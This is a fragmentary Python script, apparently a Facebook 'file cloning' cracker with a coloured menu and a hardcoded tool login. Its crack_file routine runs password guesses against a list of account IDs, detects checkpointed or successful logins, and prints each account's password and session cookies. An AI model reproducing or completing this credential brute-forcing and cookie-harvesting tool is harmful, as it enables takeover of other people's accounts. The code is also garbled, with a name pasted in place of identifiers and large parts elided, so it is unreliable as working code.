...
try:
	...
	print('[[\x1b[1;92m+\x1b[1;97m] [\x1b[1;96mSX SHAWON')
...
while attemps < 12345677901:
    ...
    if username == 'SX SHAWON' and password == 'FIRE':
...
def login():
	banner()
	SX SHAWONj('\033[1;96m[1] File Cloning\n\x1b[1;92m[2] Contact With Admin\n\033[0;97m[0] \033[0;91mEXIT ')
	SX SHAWONj('\033[0;97m===============================================')
	SX SHAWON= input('\x1b[1;92m[+] CHOOSE: ');time.sleep(0.01)
	if SX SHAWON in ['m']:
		public()
	elif SX SHAWON in ['1']:
		crack_file()
	elif SX SHAWON in ['i','0i']:
		result()
	elif SX SHAWON in ['2','02']:
...
def crack_file():
	...
	print('\033[1;32m [Put File Example:  /sdcard/SX SHAWON.txt  Etc...]')
	...
	for pw in pwv:
		try:
			...
			if "checkpoint" in po.cookies.get_dict().keys():
				#SX SHAWON-King
				print(f'\r\033[0;94m[{time.strftime("%H:%M")}•SX SHAWON-Cp] {idf} • {pw}\n\033[0;93[🤟]= COOKIES• \033[0;92m{kuki} ')     
				...
				#SX SHAWON-King
				print(f'\r\033[0;92m[SX SHAWON-➼-OK😻] {idf} • {pw}\n\033[0;93m[🔥]= COOKIES • \033[0;92m{kuki} ')
				print('\033[0;94m===============================================')
				os.system('espeak -a 300 " SX SHAWON,  Ok,  id"')
